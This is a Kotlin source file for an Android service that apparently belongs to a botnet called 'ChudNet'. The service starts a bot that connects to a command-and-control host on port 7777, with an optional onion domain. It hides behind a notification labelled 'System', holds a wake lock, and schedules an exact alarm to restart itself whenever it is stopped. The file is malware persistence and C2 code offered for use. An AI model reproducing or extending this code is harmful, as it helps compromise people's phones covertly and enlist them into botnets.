package com.chud.loadd

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log

class ChudService : Service() {

    private var wakeLock: PowerManager.WakeLock? = null
    private var bot: ChudBot? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())

        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChudNet::WakeLock")
            wakeLock?.acquire(60000)
        }
        Log.d(TAG, "Service onCreate")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (bot == null) {
            bot = ChudBot(DOMAIN, CNC_PORT, ONION_DOMAIN)
            bot?.start()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.w(TAG, "Service onDestroy")
        bot?.stop()
        bot = null
        if (wakeLock?.isHeld == true) wakeLock?.release()
        scheduleNextRun()
    }

    private fun scheduleNextRun() {
        val am = getSystemService(ALARM_SERVICE) as? AlarmManager ?: return
        val i = Intent(this, RestartReceiver::class.java)
        val pi = PendingIntent.getBroadcast(this, ALARM_REQUEST, i,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        try {
            am.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + SLEEP_INTERVAL, pi)
        } catch (_: Exception) {
            am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + SLEEP_INTERVAL, pi)
        }
        Log.d(TAG, "Next run in ${SLEEP_INTERVAL / 1000}s")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_LOW)
            channel.setSound(null, null)
            (getSystemService(NotificationManager::class.java))?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_LOW)
            .build()
    }

    companion object {
        private const val DOMAIN = "CNC_HOST"
        private const val ONION_DOMAIN: String? = null
        private const val CNC_PORT = 7777
        private const val SLEEP_INTERVAL = 60000L
        private const val TAG = "ChudNet"
        private const val CHANNEL_ID = "chudnet_channel"
        private const val NOTIFICATION_ID = 1
        private const val ALARM_REQUEST = 1001
    }
}
